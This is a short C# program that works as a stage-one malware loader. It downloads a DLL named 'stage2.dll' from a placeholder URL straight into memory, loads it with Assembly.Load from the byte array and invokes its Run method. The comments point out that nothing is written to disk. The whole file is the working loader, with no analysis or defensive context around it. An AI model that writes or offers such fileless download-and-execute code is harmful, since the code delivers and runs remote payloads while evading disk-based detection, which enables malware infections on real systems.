using System;
using System.Net.Http;
using System.Reflection;
using System.Threading.Tasks;

class Program
{
    static async Task Main()
    {
        string url = "https://example.com/stage2.dll";

        using HttpClient client = new HttpClient();

        // Download directly into RAM
        byte[] stage = await client.GetByteArrayAsync(url);

        // Load .NET assembly directly from the byte array
        Assembly assembly = Assembly.Load(stage);

        // Execute a known entry point
        Type type = assembly.GetType("Stage2.Program");
        MethodInfo method = type?.GetMethod(
            "Run",
            BindingFlags.Public | BindingFlags.Static);

        method?.Invoke(null, null);
    }
}
